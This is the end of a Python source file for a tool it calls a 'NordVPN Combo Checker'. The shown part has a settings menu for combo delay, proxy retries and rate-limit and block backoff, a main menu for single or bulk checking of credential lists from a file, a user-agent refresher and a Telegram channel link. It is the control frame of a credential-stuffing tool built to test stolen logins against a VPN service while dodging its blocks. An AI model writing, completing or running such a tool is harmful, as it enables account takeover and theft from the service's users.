            Eyelifter_log("✅", "INFO", "CONFIG", f"combo delay set to {CONFIG['combo_delay']}s")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "6":
        CONFIG["debug"] = not CONFIG["debug"]
        _loader.settings["debug"] = CONFIG["debug"]
        DEBUG = CONFIG["debug"]
        changed = True
        Eyelifter_log("✅", "INFO", "CONFIG", f"debug set to {CONFIG['debug']}")

    if changed:
        REQ_TIMEOUT = CONFIG["timeout"]
        RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
        BLOCK_BACKOFF = CONFIG["block_backoff"]
        MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
        MAX_PROXY_RETRIES = CONFIG["max_proxy_retries"]
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved to disk")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")


def Eyelifter_main():
    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    pass  # disabled in bot
    Eyelifter_banner(TOOL_NAME, "NordVPN Combo Checker")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies - direct connection")

        print(Eyelifter_color("96", "[1] Single check"))
        print(Eyelifter_color("96", "[2] Bulk check from file"))
        print(Eyelifter_color("96", "[3] UA checker (refresh shapes)"))
        print(Eyelifter_color("96", "[4] Settings"))
        print(Eyelifter_color("96", "[5] Exit"))

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_ua_checker()
        elif choice == "4":
            Eyelifter_settings_menu()
        elif choice == "5":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    try:
        Eyelifter_main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(1)